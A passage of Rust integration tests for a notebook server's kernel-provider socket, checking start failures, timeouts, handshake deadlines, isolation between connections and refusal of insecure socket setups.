        "a provider runs where it likes: {launch}"
    );
    assert_eq!(
        launch["env"],
        json!({"JPY_SESSION_NAME": "sess"}),
        "only the session name crosses: {launch}"
    );

    drop(launched);
    drop(listener);
    serving.abort();
}

/// A start the provider refuses is the caller's 500, its message intact,
/// and is tried once: a refused start is the app's own answer, not a
/// crash to retry, and no kernel is left behind.
#[tokio::test]
async fn a_refused_start_is_a_500_and_is_not_retried() {
    let _serial = serial().await;
    let dir = tempfile::tempdir().unwrap();
    let (registered, kernels) = kit(dir.path(), vec![]);
    let app = build_router(state(dir.path(), &registered, kernels.clone()));
    let listener = kernel_providers::start(
        true,
        false,
        Some(TOKEN),
        Timing::default(),
        registered.clone(),
        &BTreeMap::new(),
    )
    .expect("the socket opens");

    let mut fake = Fake::connect(listener.path()).await;
    fake.register(json!({"name": "cdp-node"})).await;
    let log = Frames::default();
    let record = log.clone();
    let _serving = tokio::spawn(async move {
        while let Some(frame) = fake.next().await {
            record.push(&frame);
            if frame["op"] == "start" {
                let id = frame["kernel_id"].as_str().unwrap().to_string();
                fake.send(json!({
                    "op": "started",
                    "kernel_id": id,
                    "error": "no browser on this machine",
                }))
                .await;
            }
        }
    });

    let (code, body) = call(
        &app,
        "POST",
        "/api/kernels",
        Some(json!({"name": "cdp-node"})),
    )
    .await;
    assert_eq!(code, StatusCode::INTERNAL_SERVER_ERROR, "{body}");
    assert!(
        body["message"]
            .as_str()
            .unwrap_or_default()
            .contains("no browser on this machine"),
        "{body}"
    );

    // One start only: a refusal is not a crash and is not retried.
    let starts = log.ops().iter().filter(|op| *op == "start").count();
    assert_eq!(starts, 1, "{:?}", log.ops());
    let (_, listed) = call(&app, "GET", "/api/kernels", None).await;
    assert!(
        listed.as_array().unwrap().is_empty(),
        "nothing is left of a kernel that never started: {listed}"
    );
}

/// A provider that accepts the start and never says whether it worked
/// doesn't hang the caller: the launch times out as a 500, and the kernel
/// is not left behind.
#[tokio::test]
async fn a_start_nobody_answers_times_out_as_a_500() {
    let _serial = serial().await;
    let dir = tempfile::tempdir().unwrap();
    let registered = Arc::new(RegisteredKernels::new());
    registered.set_fallback(
        Arc::new(StaticKernelspecs(vec![])),
        Arc::new(Never),
        Arc::new(Never),
    );
    // The API's start waits this long for `started`; a test can't wait the
    // default minute.
    let kernels = Arc::new(KernelManager::new(
        registered.clone(),
        registered.clone(),
        registered.clone(),
        KernelManagerConfig {
            startup_timeout: Duration::from_millis(300),
            root_dir: dir.path().into(),
            ..Default::default()
        },
    ));
    let app = build_router(state(dir.path(), &registered, kernels.clone()));
    let listener = kernel_providers::start(
        true,
        false,
        Some(TOKEN),
        Timing::default(),
        registered.clone(),
        &BTreeMap::new(),
    )
    .expect("the socket opens");

    let mut fake = Fake::connect(listener.path()).await;
    fake.register(json!({"name": "cdp-node"})).await;
    let log = Frames::default();
    let record = log.clone();
    let _serving = tokio::spawn(async move {
        while let Some(frame) = fake.next().await {
            // Reads, and answers nothing: the start is accepted and then
            // silence.
            record.push(&frame);
        }
    });

    let (code, body) = call(
        &app,
        "POST",
        "/api/kernels",
        Some(json!({"name": "cdp-node"})),
    )
    .await;
    assert_eq!(code, StatusCode::INTERNAL_SERVER_ERROR, "{body}");
    assert!(
        body["message"]
            .as_str()
            .unwrap_or_default()
            .contains("did not start"),
        "{body}"
    );
    let (_, listed) = call(&app, "GET", "/api/kernels", None).await;
    assert!(
        listed.as_array().unwrap().is_empty(),
        "a kernel whose start never answered is stopped, not listed: {listed}"
    );
}

/// A connection that sends nothing is closed at the hello deadline, not
/// held open forever.
#[tokio::test]
async fn a_quiet_connection_is_closed_at_the_hello_deadline() {
    use tokio::io::AsyncReadExt;

    let _serial = serial().await;
    let dir = tempfile::tempdir().unwrap();
    let (registered, _) = kit(dir.path(), vec![]);
    let timing = Timing {
        hello: Duration::from_millis(100),
        ..Timing::default()
    };
    let listener = kernel_providers::start(
        true,
        false,
        Some(TOKEN),
        timing,
        registered.clone(),
        &BTreeMap::new(),
    )
    .expect("the socket opens");

    // Not one byte, not even a hello: the refusal is a `welcome` with an
    // error, as for any failed handshake, and then EOF.
    let stream = UnixStream::connect(listener.path()).await.unwrap();
    let (r, _w) = tokio::io::split(stream);
    let mut reader = BufReader::new(r);
    let mut line = String::new();
    tokio::time::timeout(Duration::from_secs(5), reader.read_line(&mut line))
        .await
        .expect("the server refused a silent connection")
        .unwrap();
    let welcome: Value = serde_json::from_str(&line).unwrap();
    assert_eq!(welcome["op"], "welcome", "{welcome}");
    assert!(
        welcome["error"]
            .as_str()
            .unwrap_or_default()
            .contains("hello"),
        "{welcome}"
    );
    let mut buf = [0u8; 1];
    let n = tokio::time::timeout(Duration::from_secs(5), reader.read(&mut buf))
        .await
        .expect("the server closed a silent connection")
        .unwrap();
    assert_eq!(n, 0, "a connection that never said hello reads EOF");
}

/// A session started through `/api/sessions` names its notebook in
/// `launch.env.JPY_SESSION_NAME`, as a local kernel does.
#[tokio::test]
async fn a_session_start_names_the_notebook() {
    let _serial = serial().await;
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().canonicalize().unwrap();
    std::fs::write(
        root.join("nb.ipynb"),
        serde_json::to_string(&json!({
            "cells": [], "metadata": {}, "nbformat": 4, "nbformat_minor": 5
        }))
        .unwrap(),
    )
    .unwrap();
    let (registered, kernels) = kit(&root, vec![]);
    let app = build_router(state(&root, &registered, kernels));
    let listener = kernel_providers::start(
        true,
        false,
        Some(TOKEN),
        Timing::default(),
        registered.clone(),
        &BTreeMap::new(),
    )
    .expect("the socket opens");

    let mut fake = Fake::connect(listener.path()).await;
    fake.register(json!({"name": "cdp-node", "display_name": "Node"}))
        .await;
    let log = Frames::default();
    let _serving = tokio::spawn(serve(fake, log.clone(), Arc::new(AtomicBool::new(false))));

    let (code, session) = call(
        &app,
        "POST",
        "/api/sessions",
        Some(json!({
            "path": "nb.ipynb",
            "name": "nb.ipynb",
            "type": "notebook",
            "kernel": {"name": "cdp-node"},
        })),
    )
    .await;
    assert_eq!(code, StatusCode::CREATED, "{session}");
    let starts = log.starts();
    assert_eq!(starts.len(), 1, "{starts:?}");
    assert_eq!(
        starts[0]["env"]["JPY_SESSION_NAME"],
        json!(root.join("nb.ipynb").to_str().unwrap()),
        "the session's notebook is the kernel's name: {starts:?}"
    );
    assert!(
        starts[0].get("cwd").is_none() && starts[0]["env"].as_object().unwrap().len() == 1,
        "and nothing else: {starts:?}"
    );
}

/// A second connection can neither deliver into nor end a kernel the
/// first connection started.
#[tokio::test]
async fn another_connection_cannot_deliver_to_or_end_a_kernel() {
    let _serial = serial().await;
    let dir = tempfile::tempdir().unwrap();
    let (registered, kernels) = kit(dir.path(), vec![]);
    let app = build_router(state(dir.path(), &registered, kernels));
    let listener = kernel_providers::start(
        true,
        false,
        Some(TOKEN),
        Timing::default(),
        registered.clone(),
        &BTreeMap::new(),
    )
    .expect("the socket opens");

    let mut first = Fake::connect(listener.path()).await;
    first
        .register(json!({"name": "cdp-node", "display_name": "Node"}))
        .await;
    let log = Frames::default();
    let _serving = tokio::spawn(serve(first, log.clone(), Arc::new(AtomicBool::new(false))));

    let (code, kernel) = call(
        &app,
        "POST",
        "/api/kernels",
        Some(json!({"name": "cdp-node"})),
    )
    .await;
    assert_eq!(code, StatusCode::CREATED, "{kernel}");
    let id = kernel["id"].as_str().unwrap().to_string();
    let starts = || {
        log.0
            .lock()
            .unwrap()
            .iter()
            .filter(|f| f["op"] == "start")
            .count()
    };
    assert_eq!(starts(), 1);

    // A second provider, holding no kernel of its own, tries both. A
    // status with no parent sets the kernel's execution state, so a
    // delivered one would show at /api/kernels/<id>; an ended one would
    // have the host restart the kernel through its provider, a second
    // `start`.
    let mut second = Fake::connect(listener.path()).await;
    let injected = Message::new("status", "s", "u", &json!({"execution_state": "busy"}));
    second
        .send(json!({
            "op": "deliver", "kernel_id": id, "channel": "iopub", "msg": wire(&injected),
        }))
        .await;
    second
        .send(json!({"op": "ended", "kernel_id": id, "reason": "exited"}))
        .await;
    // A round trip, so both frames are certainly processed.
    let reply = second
        .register(json!({"name": "second-only", "display_name": "Second"}))
        .await;
    assert_eq!(reply["name"], "second-only", "{reply}");

    let (code, listing) = call(&app, "GET", "/api/kernels", None).await;
    assert_eq!(code, StatusCode::OK);
    assert!(
        listing
            .as_array()
            .unwrap()
            .iter()
            .any(|k| k["id"] == json!(id)),
        "the first connection's kernel is still there: {listing}"
    );
    // Give a restart, had there been one, time to reach the provider.
    tokio::time::sleep(Duration::from_millis(500)).await;
    assert_eq!(starts(), 1, "no restart after another connection's `ended`");
    let (code, model) = call(&app, "GET", &format!("/api/kernels/{id}"), None).await;
    assert_eq!(code, StatusCode::OK, "{model}");
    assert_ne!(
        model["execution_state"], "busy",
        "another connection's status was delivered: {model}"
    );

    // Its output is the provider's, with nothing injected.
    std::fs::write(
        dir.path().join("run.ipynb"),
        serde_json::to_string(&json!({
            "cells": [{"cell_type": "code", "execution_count": null, "id": "a",
                       "metadata": {}, "outputs": [], "source": "2+2"}],
            "metadata": {}, "nbformat": 4, "nbformat_minor": 5
        }))
        .unwrap(),
    )
    .unwrap();
    let (code, v) = call(&app, "POST", "/api/fileid/index?path=run.ipynb", None).await;
    assert_eq!(code, StatusCode::OK, "{v}");
    let document = format!("json:notebook:{}", v["id"].as_str().unwrap());
    let hash = ganymede_documents::murmur2(b"2+2", 0).to_string();
    let (code, v) = call(
        &app,
        "POST",
        &format!("/api/kernels/{id}/execute"),
        Some(json!({
            "document_id": document,
            "wait": 15,
            "cells": [{"cell_id": "a", "source_hash": hash}],
        })),
    )
    .await;
    assert_eq!(code, StatusCode::OK, "{v}");
    let outputs = v["cells"][0]["outputs"].to_string();
    assert!(outputs.contains("ran 2+2"), "{v:#}");
}

/// The queue's capacity is what cuts a provider off when it stops reading,
/// not the write stall: with a long stall and a short queue, the
/// connection closes and the kernel is lost.
#[tokio::test]
async fn a_full_queue_closes_the_connection() {
    let _serial = serial().await;
    let dir = tempfile::tempdir().unwrap();
    let (registered, _) = kit(dir.path(), vec![]);
    let timing = Timing {
        hello: Duration::from_secs(5),
        write_stall: Duration::from_secs(60),
        queue: 4,
    };
    let listener = kernel_providers::start(
        true,
        false,
        Some(TOKEN),
        timing,
        registered.clone(),
        &BTreeMap::new(),
    )
    .expect("the socket opens");

    let mut fake = Fake::connect(listener.path()).await;
    fake.register(json!({"name": "cdp-node", "display_name": "Node"}))
        .await;
    let log = Frames::default();
    let mute = Arc::new(AtomicBool::new(false));
    let _serving = tokio::spawn(serve(fake, log, mute.clone()));

    let spec = spec("cdp-node");
    let launched = registered
        .launch(
            &spec,
            LaunchOptions {
                kernel_id: Some("full".into()),
                cwd: Some(dir.path().into()),
                startup_timeout: Some(Duration::from_secs(10)),
                ..Default::default()
            },
        )
        .await
        .expect("the provider starts the kernel");
    let session = KernelSession::start(
        registered.connect(&launched).await.unwrap(),
        Some(&launched),
    );

    // Mute, then past the four-frame queue with messages too big for the
    // socket's buffers. The stall is a minute, so only the queue can close
    // this in the time the test waits.
    mute.store(true, Ordering::SeqCst);
    let started = std::time::Instant::now();
    for _ in 0..10 {
        let mut big = Message::new("execute_request", "s", "u", &json!({"code": "x"}));
        big.buffers = vec![vec![0u8; 16 * 1024 * 1024].into()];
        let _ =
            tokio::time::timeout(Duration::from_secs(2), session.send(Channel::Shell, big)).await;
        if !launched.process.is_alive() {
            break;
        }
    }
    let deadline = started + Duration::from_secs(10);
    while launched.process.is_alive() {
        assert!(
            std::time::Instant::now() < deadline,
            "a full queue did not close the connection"
        );
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
    assert_eq!(launched.process.exit_reason(), Some("lost"));
    assert!(!launched.process.restartable());
}

/// Each refusal returns `None` and leaves no socket file.
#[tokio::test]
async fn a_refusal_leaves_no_socket() {
    use std::os::unix::fs::PermissionsExt;

    let _serial = serial().await;
    let dir = tempfile::tempdir().unwrap();
    let socket = |at: &Path| at.join(format!("ganymede-kernels-{}.sock", std::process::id()));

    // No token: the socket would be open to anyone who can reach it.
    let (registered, _) = kit(dir.path(), vec![]);
    assert!(kernel_providers::start(
        true,
        false,
        None,
        Timing::default(),
        registered.clone(),
        &BTreeMap::new()
    )
    .is_none());
    // Embedded: no socket at all.
    assert!(kernel_providers::start(
        true,
        true,
        Some(TOKEN),
        Timing::default(),
        registered.clone(),
        &BTreeMap::new()
    )
    .is_none());
    // Off.
    assert!(kernel_providers::start(
        false,
        false,
        Some(TOKEN),
        Timing::default(),
        registered.clone(),
        &BTreeMap::new()
    )
    .is_none());

    // A runtime dir another user can write: the socket's mode would mean
    // nothing.
    let at = runtime_dir();
    // Back to owner-only even when an assertion below fails, so later
    // tests don't run against an open runtime dir.
    struct Restore(std::path::PathBuf);
    impl Drop for Restore {
        fn drop(&mut self) {
            let _ = std::fs::set_permissions(&self.0, std::fs::Permissions::from_mode(0o700));
        }
    }
    let restore = Restore(at.clone());
    std::fs::set_permissions(&at, std::fs::Permissions::from_mode(0o777)).unwrap();
    let refused = kernel_providers::start(
        true,
        false,
        Some(TOKEN),
        Timing::default(),
        registered.clone(),
        &BTreeMap::new(),
    );
    assert!(refused.is_none(), "a world-writable runtime dir is refused");
    assert!(!socket(&at).exists(), "no socket in it");
    drop(restore);

    // A path over the platform's `sun_path` limit.
    let long = dir.path().join("a".repeat(120));
    std::fs::create_dir_all(&long).unwrap();
    std::fs::set_permissions(&long, std::fs::Permissions::from_mode(0o700)).unwrap();
    std::env::set_var("JUPYTER_RUNTIME_DIR", &long);
    let refused = kernel_providers::start(
        true,
        false,
        Some(TOKEN),
        Timing::default(),
        registered,
        &BTreeMap::new(),
    );
    std::env::set_var("JUPYTER_RUNTIME_DIR", runtime_dir());
    assert!(refused.is_none(), "a path over the limit is refused");
    assert!(!socket(&long).exists(), "no socket there");
}

/// Dropping the listener closes the connections it accepted, not just the
/// file, and removes the file.
#[tokio::test]
async fn dropping_the_listener_closes_live_connections() {
    let _serial = serial().await;
    let dir = tempfile::tempdir().unwrap();
    let (registered, _) = kit(dir.path(), vec![]);
    let listener = kernel_providers::start(
        true,
        false,
        Some(TOKEN),
        Timing::default(),
        registered,
        &BTreeMap::new(),
    )
    .expect("the socket opens");
    let path = listener.path().to_path_buf();

    let mut fake = Fake::connect(&path).await;
    fake.register(json!({"name": "cdp-node", "display_name": "Node"}))
        .await;

    drop(listener);
    assert!(!path.exists(), "the socket file went with it");
    let frame = tokio::time::timeout(Duration::from_secs(5), fake.next())
        .await
        .expect("the provider's connection was closed");
    assert!(
        frame.is_none(),
        "a frame after the listener went away: {frame:?}"
    );
}
